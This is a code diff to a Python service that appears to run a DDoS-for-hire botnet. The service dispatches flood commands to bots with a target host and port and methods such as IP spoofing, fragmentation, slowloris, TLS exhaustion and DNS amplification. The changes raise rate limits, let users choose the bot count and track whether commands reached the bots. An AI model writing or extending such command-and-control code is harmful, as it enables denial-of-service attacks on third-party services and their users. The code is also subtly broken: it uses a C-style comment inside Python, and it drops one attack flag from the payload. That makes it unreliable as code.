@@ -17,7 +17,7 @@ class AttackService:
             plan = None
             max_concurrent = 10
             max_secs = 3600
-            max_pps = 5_000_000
+            max_pps = 100_000_000  /* admin: no limit */
             allowed = None
             cooldown = 0
 
@@ -67,7 +67,7 @@ class AttackService:
                     raise HTTPException(429, "Max concurrent attacks reached for your plan")
 
             available = await BotService.get_available_bots(
-                max_concurrent, [data.method],
+                data.bot_count if data.bot_count > 1 else max_concurrent, [data.method],
                 user_id=None if is_admin else user.id,
             )
             # Admin can use any online bot
@@ -96,7 +96,7 @@ class AttackService:
                 dns_amp=data.dns_amp,
                 game_mimic=data.game_mimic,
                 mega_mode=data.mega_mode,
-                status="running",
+                status="pending",
                 bot_ids=bot_ids,
                 started_at=datetime.now(timezone.utc),
             )
@@ -105,23 +105,35 @@ class AttackService:
             await s.refresh(task)
 
             method = data.method.upper()
+            delivered = 0
             for bot in available:
-                await manager.send_attack_command(str(bot.id), {
-                    "id": str(task.id),
-                    "target": data.target_host,
-                    "port": data.target_port,
-                    "method": method,
-                    "duration": data.duration_secs,
-                    "pps": data.pps_per_bot,
-                    "threads": bot.max_threads or 100,
-                    "spoof_mode": data.spoof_mode,
-                    "fragmentation": int(data.fragmentation),
-                    "slowloris": int(data.slowloris or method == "SLOWLORIS"),
-                    "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
-                    "dns_amp": int(data.dns_amp or method == "DNS_AMP"),
-                    "game_mimic": int(data.game_mimic or method == "GAME_MIMIC"),
-                    "mega_mode": int(data.mega_mode or method == "MEGA"),
-                })
+                try:
+                    await manager.send_attack_command(str(bot.id), {
+                        "id": str(task.id),
+                        "target": data.target_host,
+                        "port": data.target_port,
+                        "method": method,
+                        "duration": data.duration_secs,
+                        "pps": data.pps_per_bot,
+                        "threads": bot.max_threads or 100,
+                        "spoof_mode": data.spoof_mode,
+                        "fragmentation": int(data.fragmentation),
+                        "slowloris": int(data.slowloris or method == "SLOWLORIS"),
+                        "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
+                        "dns_amp": int(data.dns_amp or method == "DNS_AMP"),
+                        "mega_mode": int(data.mega_mode or method == "MEGA"),
+                    })
+                    delivered += 1
+                except Exception as e:
+                    print(f"[atk] failed to send to bot {bot.id}: {e}")
+
+            if delivered == 0:
+                task.status = "failed"
+                await s.commit()
+                raise HTTPException(503, "No bots could be reached to deliver command")
+
+            task.status = "running"
+            await s.commit()
             return task
 
     @staticmethod
@@ -138,7 +150,10 @@ class AttackService:
             task.completed_at = datetime.now(timezone.utc)
             await s.commit()
             for bid in (task.bot_ids or []):
-                await manager.send_stop_command(str(bid), str(task_id))
+                try:
+                    await manager.send_stop_command(str(bid), str(task_id))
+                except Exception:
+                    pass
 
     @staticmethod
     async def get_user_tasks(user_id: UUID) -> List[AttackTask]:
